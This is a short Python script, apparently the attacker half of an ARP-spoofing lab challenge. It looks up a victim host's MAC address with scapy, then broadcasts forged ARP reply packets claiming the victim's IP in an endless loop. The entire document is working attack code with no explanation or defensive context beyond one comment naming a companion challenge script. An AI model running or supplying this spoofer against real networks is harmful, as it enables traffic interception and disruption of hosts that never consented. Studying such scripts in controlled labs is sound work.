from scapy.all import *
import typer
from rich.console import Console
console = Console()

BROADCAST = "FF:FF:FF:FF:FF:FF"

def getMAC(ip: str):
    mac, _ = srp(Ether(dst=BROADCAST)/ARP(pdst=ip), timeout=2, verbose=0)
    if mac:
        return mac[0][1].src
    return None

#Victim ip address must be the same destination ip address (H2_ip) set in the ARPSpooferChallengeSender.py
def main(victim_ip: str):
    
    victim_mac = getMAC(victim_ip)
    if not victim_mac:
        console.print(f"[red]Could not find MAC address for {victim_ip}[/red]")
        raise typer.Exit()
    console.print(f"[green]Victim MAC address: {victim_mac}[/green]")
    pkt = Ether(src=victim_mac, dst=BROADCAST)/ARP(op=2, hwsrc=victim_mac, pdst=victim_ip)
    with console.status("Sending Packets..."):
        sendp(pkt, loop=1, inter=0.2)




if __name__ == "__main__":
    typer.run(main)
